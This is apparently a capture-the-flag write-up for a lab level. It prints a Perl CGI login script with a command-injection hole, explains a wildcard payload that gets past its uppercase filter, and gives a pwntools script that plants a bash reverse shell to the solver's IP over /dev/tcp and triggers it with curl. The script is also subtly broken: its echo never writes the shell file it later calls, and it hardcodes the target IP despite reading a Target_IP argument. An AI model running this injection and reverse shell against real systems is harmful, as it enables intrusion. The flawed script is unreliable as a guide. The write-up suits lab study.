# Level 16

## Discription

> There is a perl script running on port 1616. \
\
> To do this level, log in as the level16 account with the password level16. Files for this level can be found in /home/flag16.

## Source Code

```perl
#!/usr/bin/env perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub login {
  $username = $_[0];
  $password = $_[1];

  $username =~ tr/a-z/A-Z/; # conver to uppercase
  $username =~ s/\s.*//;        # strip everything after a space

  @output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
  foreach $line (@output) {
      ($usr, $pw) = split(/:/, $line);
  

      if($pw =~ $password) {
          return 1;
      }
  }

  return 0;
}

sub htmlz {
  print("<html><head><title>Login resuls</title></head><body>");
  if($_[0] == 1) {
      print("Your login was accepted<br/>");
  } else {
      print("Your login failed<br/>");
  }    
  print("Would you like a cookie?<br/><br/></body></html>\n");
}

htmlz(login(param("username"), param("password")));
```

## Solution

This is a RCE challenge but with a twist. Code is simple.

It takes two argument then capitalise $username and removes the part after the space in $username.

```perl
$username = $_[0];
$password = $_[1];
$username =~ tr/a-z/A-Z/;
$username =~ s/\s.*//; 
```

Then $username is passed to egrep command.

```perl
@output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
```

In order to execute our code we have to keep two things in mind we cannot use space in our command and our command will get converted to uppercase.

As we know bash is case sensitive so we cannot write commands in uppercase.

But we can create a script and name it with all uppercase letters.

Also, we cannot give absolute path to our script as directory names are in small letter like /etc or /tmp. 

We will use wildcard instead of directory name so it will search for our script in every directory.

Our payload will look like  -

```bash
$(/*/exploit)
```

Create a script /tmp/EXPLOIT as * will replace tmp at some-point and our exploit will get converted to EXPLOIT due to first filter.

Remember to url encode our payload

![](Images/solution.png)

## Python

```python
#!/usr/bin/python3

from pwn import *
from sys import argv,exit

if len(argv) < 3:
	sys.exit(f"{argv[0]} Target_IP Local_IP") 

level16 = ssh(host=argv[1],user='level16',password='level16')
level16_shell = level16.shell('sh')
level16_shell.sendline(f"echo -e '#!/bin/bash\\nbash -i >& /dev/tcp/{argv[2]}/4444 0>&1'")
netcat = process(['nc','-l','4444'])
curl = process(['curl','http://192.168.56.105:1616/index.cgi?username=%24%28%2F%2A%2Fexploit%29&password=hello'])
netcat.sendline('getflag')
netcat.interactive(prompt="")
```

